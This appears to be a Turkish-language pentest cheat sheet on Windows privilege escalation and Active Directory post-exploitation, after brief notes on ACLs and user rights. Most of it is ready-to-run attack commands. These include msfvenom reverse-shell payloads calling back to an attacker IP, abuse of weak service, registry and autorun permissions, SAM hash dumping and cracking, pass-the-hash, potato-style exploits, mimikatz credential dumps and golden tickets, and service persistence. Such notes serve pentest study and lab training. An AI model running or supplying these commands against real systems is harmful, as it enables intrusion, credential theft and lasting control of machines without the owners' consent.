- Reverse Shell
- Unquoted Service Path
- Weak Registry Permissions
- Insecure Service Permissions
- Insecure Service Executables
- Autoruns
- Always Install Elevated
- Searching for Passwords in Registry
- Using Stored Credentials
- Security Account Manager (SAM)
- Passing the Hash
- Scheduled Tasks
- Insecure GUI Apps
- Startup Apps
- Rogue Potato
- Print Spoofer
- Privilege Escalation Scripts
- Post-Exploitation - Persistence
1. Enumeration w/PowerView
2. Enumeration w/BloodHound
3. Dump Hashes w/mimikatz
4. Golden Ticket Attacks w/mimikatz
5. Maintaining Access

---

# Windows Access Control Lists (ACLs)

- Windows'ta nesnelere erişim yetkileri ACL'ler ile tanımlanır. ACL yönetim aracı "icacls.exe" dir.
- "icacls \*" veya "icacls <path/to/file>" komutları ile, ilgili kaynağın erişim yetkileri listelenir.
- Alternatif olarak accesschk aracı kullanılabilir. 
- "Get-ACL" de kullanılabilir.

| İfade | Anlamı |
| - | - |
| (F) | Grup veya kullanıcının tam yetkili olduğunu gösterir. |
| (M) | Grup veya kullanıcının değiştirme yetkisi olduğunu gösterir. |
| (R) | Grup veya kullanıcının okuma yetkisine sahip olduğunu gösterir. |
| (W) | Grup veya kullanıcının yazma yetkisine sahip olduğunu gösterir. |
| (I) | Dosya veya dizin için yetkilerin inherit edildiğini gösterir. |
| (RX) | Grup veya kullanıcının okuma ve çalıştırma yetkisi olduğunu gösterir. |
| (OI) | Nesneler için yetkilerin inherit edildiğini gösterir. |
| (CI) | Dizinler için yetkilerin inherit edildiğini gösterir. |
| (IO) | Dizinler için yetkilerin inherit edildiğini fakat dosyalara uygulanmadığını gösterir. |

| Komut | Açıklama |
| - | - | 
| icacls /? | Yardım menüsünü açar. |
| icacls \* <br/> icacls C:\<directory> <br/> icacls C:\Path\To\File |  Dosya veya dizinler için ACL'leri listeler. |
| icacls C:\File /grant <user/group>:F /Q /C /T | Dosya veya dizin için full yetki verir. |
| icacls C:\File /deny <user/group>:F | Dosya veya dizin için yetki engellenir. |
| icacls C:\File /remove <user/group>:F | Dosya veya dizin için yetki kaldırılır.|
| icacls C:\File /grant <user/group>:(OI)(CI)(F) | Tam yetki, alt dizinler ve dosyalar içinde uygulanır. |
| icacls C:\File /setowner <user/group> /T /C /Q | Aitlik alır. |
| icacls C:\File /reset /T | ACL'leri resetler. |

---

# User Rights Assignment

- Kullanıcı veya grupların gerçekleştirebilecekleri eylemleri sınırlandırır. Group Policy ile kullanıcı yetki atamaları yapan bir mekanizmadır. 
- **whoami /priv** komutu ile kullanıcının yetkileri listelenir.

| Hak | Açıklama |
| - | - |
| SeBackupPrivileges <br/> SeRestorePrivileges | Dosya ve dizin yedeği alabilme ve geri dönebilme yetkisidir. |
| SeTakeOwnershipPrivilege | Dosya ve dizinlerin aitliğini alabilme yetkisidir. |
| SeImpersonatePrivilege <br/> SeDelegateSessionUserImpersonatePrivilege | Bir kullanıcı veya işlemin diğer kullanıcı haklarına bürünmesi yetkisidir. |
| SeDebugPrivilege | Sahibi olunmayan işlemlere müdahale yetkisidir. |

```shell
# Ayar Dosyası
Local Group Policy -> Computer Configuration -> Windows Settings -> Security Settings -> Local Policies -> User Rights Assignment
```

---

# REVERSE SHELL

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_ADDR> LPORT=<PORT> -f exe -o reverse.exe
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
copy \\<IP_ADDR>\kali\reverse.exe C:\Temp\reverse.exe
nc -lvnp <PORT>
msfconsole -> use exploit/multi/handler -> set payload windows/x64/shell_reverse_tcp
C:\Temp\reverse.exe
```

---

# UNQUOTED SERVICE PATH

```powershell
.\winPEAS64.exe servicesinfo
sc qc unquotedsvc
.\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_ADDR> LPORT=<PORT> -f exe -o common.exe
copy \\<IP_ADDR>\kali\common.exe C:\Temp\common.exe
copy C:\Temp\common.exe "C:\Program Files\Unquoted Path Service\common.exe"
net start unquotedsvc
```

---

# WEAK REGISTRY PERMISSIONS

```powershell
.\winPEAS64.exe servicesinfo
sc qc regsvc
.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_ADDR> LPORT=<PORT> -f exe -o reverse.exe
copy \\<IP_ADDR>\kali\reverse.exe C:\Temp\reverse.exe
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\Temp\reverse.exe /f
net start regsvc
```

---

# INSECURE SERVICE PERMISSIONS

```powershell
.\winPEAS64.exe servicesinfo
.\accesschk.exe /accepteula -uwcqv user daclsvc
sc qc daclsvc
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_ADDR> LPORT=<PORT> -f exe -o reverse.exe
copy \\<IP_ADDR>\kali\reverse.exe C:\Temp\reverse.exe
sc config daclsvc binpath= "\"C:Temp\reverse.exe\""
net start daclsvc
```

---

# INSECURE SERVICE EXECUTABLES

```powershell
.\winPEAS64.exe servicesinfo
sc qc filepermsvc
.\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_ADDR> LPORT=<PORT> -f exe -o reverse.exe
copy \\<IP_ADDR>\kali\reverse.exe C:\Temp\reverse.exe
copy C:\Temp\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
net start filepermsvc
```

---

# AUTORUNS

```powershell
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
.\accesschk.exe -wvu "C:\Program Files\Autorun Program\program.exe"
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_ADDR> LPORT=<PORT> -f exe -o reverse.exe
copy \\<IP_ADDR>\kali\reverse.exe C:\Temp\reverse.exe
copy C:\Temp\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
rdesktop <IP_ADDR>
```

---

# ALWAYS INSTALL ELEVATED

```powershell
.\winPEAS64.exe
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_ADDR> LPORT=<PORT> -f msi -o reverse.msi
certutil -urlcache -f http://<IP_ADDR>/reverse.msi reverse.msi
msiexec /quiet /qn /i C:\Temp\reverse.msi
```

---

# SEARCHING FOR PASSWORDS IN REGISTRY

```powershell
.\winPEAS64.exe windowscreds
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\Sofware\Microsoft\Windows NT\CurrentVersion\winlogon"
winexe -U '<user>%<password>' //<IP_ADDR> cmd.exe
python3 /usr/share/doc/python3-impacket/examples/psexec.py <user>@<IP_ADDR> cmd.exe
```

---

# USING STORED CREDENTIALS

```powershell
cmdkey /list
runas /savecred /user:admin C:\Temp\reverse.exe
```

---

# SECURITY ACCOUNT MANAGER (SAM)

```powershell
copy C:\Windows\Repair\SAM \\<IP_ADDR>\kali\
copy C:\Windows\Repair\SYSTEM \\<IP_ADDR>\kali\
python3 /usr/share/creddump7/pwdump.py SYSTEM SAM
hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
john hash --format=NT -w=/usr/share/wordlists/rockyou.txt
msfconsole -> use exploit/windows/smb/psexec -> set payload windows/x65/shell_reverse_tcp
```

---

# PASSING THE HASH

```powershell
pth-winexe -U '<user>%hash' //<IP_ADDR> cmd.exe
evil-winrm -i <IP_ADDR> -u <user> -H HASH
```

---

# SCHEDULED TASKS

```powershell
type C:\DevTools\CleanUp.ps1
C:\Temp\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
echo C:\Temp\reverse.exe >> C:\DevTools\CleanUp.ps1
```

---

# INSECURE GUI APPS

```powershell
rdesktop -u <user> -p <password> <IP_ADDR>
tasklist /V | findstr mspaint.exe
File -> Open -> file://c:/windows/system32/cmd.exe
```

---

# STARTUP APPS

```powershell
.\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
cscript C:\Temp\CreateShortcut.vbs
```

```powershell
# CreateShortcut.vbs
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\Temp\reverse.exe"
oLink.Save
```

```powershell
rdesktop -u <user> <IP_ADDR>
```

---

# ROGUE POTATO

```powershell
sudo socat tcp-listen:135,reuseaddr,fork tcp:<IP_ADDR>.<PORT>
.\PSExec64.exe -i -u "nt authority\local service" C:\Temp\reverse.exe
.\RoguePotato.exe -r <IP_ADDR> -e "C:\PrivEsc\reverse.exe" -l <PORT>
```

---

# PRINT SPOOFER

```powershell
.\PSExec64.exe -i -u "nt authority\local service" C:\Temp\reverse.exe
.\PrintSpoofer.exe -c "C:\Temp\reverse.exe" -i
```

--- 

# PORT-EXPLOITATION - PERSISTENCE

### Enumeration w/PowerView

```powershell
powershell -ep bypass
.\PowerView.ps1
Get-NetUser | select cn
Get-NetGroup -GroupName *admin*
#https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
```

### Enumeration w/BloodHound

```powershell
neo4j console
powershell -ep bypass
.\SharpHound.ps1
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
```

### Dump Hashes w/mimikatz

```powershell
.\mimikatz.exe
privilege::debug
lsadump::lsa /patch
hashcat -m 1000 <hash> /usr/share/wordlists/rockyou.txt
```

### Golden Ticket Attacks w/mimikatz

```powershell
.\mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt
kerberos::golden /user:Administrator /domain:controller.local /sid:SID /krbtgt:KRBTGT-NTLM /id:500
misc::cmd
.\PSExec.exe \\Desktop-1 cmd.exe
```

### Maintaining Access

```powershell
msfconsole -> use exploit/windows/local/persistence_service
```

---

# PRIVILEGE ESCALATION SCRIPTS

* winPEASany.exe
* seatbelt.exe
* PowerUp.ps1
* SharpUp.exe